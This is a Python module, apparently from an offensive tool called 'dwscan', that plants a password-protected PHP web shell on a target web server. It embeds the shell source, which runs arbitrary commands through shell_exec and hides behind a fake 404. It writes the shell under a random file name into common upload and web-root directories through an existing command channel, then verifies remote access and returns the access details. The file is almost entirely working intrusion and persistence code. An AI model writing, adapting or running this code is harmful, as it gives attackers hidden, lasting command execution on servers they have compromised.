from __future__ import annotations
import base64
import secrets
import time

from .models import Access, Target
from .audit import Audit
from .fingerprint import session

SHELL = r"""<?php
/* dwscan drop */
if (($_GET['k'] ?? '') !== '__PW__') { header('HTTP/1.1 404 Not Found'); exit; }
header('Content-Type: text/plain; charset=utf-8');
$c = $_POST['c'] ?? $_GET['c'] ?? '';
if ($c === '') { echo "OK ", PHP_VERSION, " ", getcwd(), " ", php_uname('n'), "\n"; exit; }
echo shell_exec($c . ' 2>&1');
"""

CANDIDATES = ["/", "/var/www/html/", "/var/www/", "/uploads/", "/wp-content/uploads/",
              "/images/", "/files/", "/media/", "/assets/", "/tmp/"]


def _name() -> str:
    return "_" + secrets.token_hex(4) + ".php"


def deploy(runner, t: Target, path: str, writable: list, audit: Audit):
    pw = secrets.token_hex(12)
    name = _name()
    payload = base64.b64encode(SHELL.replace("__PW__", pw).encode()).decode()
    cwd = ""
    for _ in range(3):
        x = runner.run(t.url, "pwd", timeout=20)
        if x.ok and x.stdout.strip().startswith("/"):
            cwd = x.stdout.strip().splitlines()[-1]
            break
        time.sleep(1)
    dirs = [path]
    if cwd.startswith("/"):
        dirs.insert(0, cwd)
    dirs += [d for d in writable if d.rstrip("/") + "/" in CANDIDATES or d in CANDIDATES]
    dirs += [d for d in CANDIDATES if d not in dirs]

    for d in dirs:
        remote = d.rstrip("/") + "/" + name
        r = runner.run(t.url, f"printf %s {payload} | base64 -d > '{remote}' && echo DWOK",
                       timeout=90, audit=audit)
        if "DWOK" not in r.stdout:
            continue
        rel = "/" + name
        if cwd and d.startswith(cwd.rstrip("/") + "/"):
            rel = d[len(cwd.rstrip("/")):] + "/" + name
        for _ in range(3):
            try:
                resp = session().get(t.url + rel + f"?k={pw}", timeout=15)
                if resp.status_code == 200 and resp.text.startswith("OK "):
                    audit.write("deploy", "shell_verified", t.url, shell=remote, url=rel)
                    return Access("webshell", t.url + rel, pw, verified=True)
            except Exception:
                pass
            time.sleep(2)
        runner.run(t.url, f"rm -f '{remote}'", timeout=45)
    return None


def remove(runner, t: Target, acc: Access, audit: Audit) -> bool:
    path = acc.locator.replace(t.url, "")
    ok = "DWRM" in runner.run(t.url, f"rm -f '{path}' && echo DWRM", timeout=60).stdout
    if ok:
        acc.removed = True
        audit.write("deploy", "shell_removed", t.url, shell=path)
    return ok
